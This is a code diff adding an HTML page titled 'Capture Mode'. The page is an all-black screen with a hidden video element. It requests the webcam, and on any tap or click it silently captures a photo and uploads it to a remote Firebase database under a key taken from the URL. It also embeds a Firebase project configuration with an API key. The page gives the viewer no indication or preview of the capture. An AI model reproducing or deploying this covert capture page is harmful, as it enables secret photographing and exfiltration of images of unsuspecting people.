@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Capture Mode</title>
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      width: 100vw;
+      height: 100vh;
+    }
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body onclick="capture()" ontouchstart="capture()">
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyByYx-ScUywHwz_YK_ZV7rDREBTScrWWKs",
+      authDomain: "livesnap-d57c2.firebaseapp.com",
+      databaseURL: "https://livesnap-d57c2-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "livesnap-d57c2",
+      storageBucket: "livesnap-d57c2.firebasestorage.app",
+      messagingSenderId: "24202813286",
+      appId: "1:24202813286:web:02304adf2c5ffed9fab2a7",
+      measurementId: "G-BR9MFH2XN6"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const key = urlParams.get('key');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      video.srcObject = stream;
+    });
+
+    function capture() {
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL("image/jpeg");
+
+      db.ref("livephoto/" + key).set({
+        image: dataUrl,
+        time: Date.now()
+      });
+    }
+  </script>
+</body>
+</html>
